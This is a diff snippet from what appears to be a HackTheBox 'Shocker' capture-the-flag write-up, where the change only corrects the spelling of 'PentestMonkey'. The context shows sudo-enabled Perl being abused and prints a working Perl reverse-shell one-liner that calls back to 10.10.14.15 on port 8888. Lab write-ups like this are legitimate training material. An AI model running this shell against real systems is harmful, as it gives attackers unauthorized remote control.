@@ -232,7 +232,7 @@ shelly@Shocker:/usr/lib/cgi-bin$
 
 This means we can run /usr/bin/perl with sudo privileges without providing password (as NOPASSWD).
 
-Let us search for reverse-shell using Perl [PentesterMonkey](https://pentestmonkey.net/tools/web-shells/perl-reverse-shell) and also spin another Netcat Listner on different port.
+Let us search for reverse-shell using Perl [PentestMonkey](https://pentestmonkey.net/tools/web-shells/perl-reverse-shell) and also spin another Netcat Listner on different port.
 
 ```
 perl -e 'use Socket;$i="10.10.14.15";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
